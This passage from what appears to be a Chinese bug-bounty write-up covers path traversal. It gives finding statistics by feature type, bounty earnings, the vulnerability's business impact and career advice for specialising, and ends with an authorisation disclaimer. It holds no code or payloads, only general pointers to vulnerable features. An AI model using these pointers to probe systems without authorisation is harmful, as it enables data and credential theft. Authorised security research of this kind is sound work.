  
备份恢复功能路径注入  
（9例，19.1%）  
  
图片处理参数污染  
（5例，10.6%）  
  
配置文件读取未过滤  
（4例，8.5%）  
  
最高单笔奖金  
：四舍五入大约有8000元（某金融科技公司，可读取数据库备份文件）  
  
总奖金收益  
：四舍五入过万元（平均每月四舍五入过万元）  
# 专业价值：为什么路径遍历值得深度挖掘  
  
检测盲区  
：大多数DAST扫描器仅测试基础../  
模式，缺乏深度上下文分析  
  
业务影响  
：可直接访问配置文件、源代码、业务数据，影响远超XSS等前端漏洞  
  
利用稳定  
：文件系统操作通常无需复杂条件竞争或环境依赖  
  
权限升级  
：往往是进入内网、获取凭证、提升权限的起点  
# 三条建议  
  
建立垂直专长  
：在某个漏洞类型上达到行业顶尖5%水平，比泛泛了解所有漏洞更有价值  
  
开发专属工具  
：通用工具覆盖通用场景，专业场景需要专业工具  
  
输出方法论  
：将个人经验转化为可复用的方法论，建立行业影响力  
  
路径遍历不是“低级”漏洞，而是需要深度理解文件系统、Web服务器、应用程序框架和业务上下文的复杂攻击面。当大多数人还在使用自动化工具进行浅层测试时，深度研究者已经在这个领域建立了难以逾越的专业壁垒。  
  
（本文所述技术均在合法授权范围内使用，所有测试均已获得目标系统所有者明确许可。未经授权的测试可能违反法律法规。）  
  
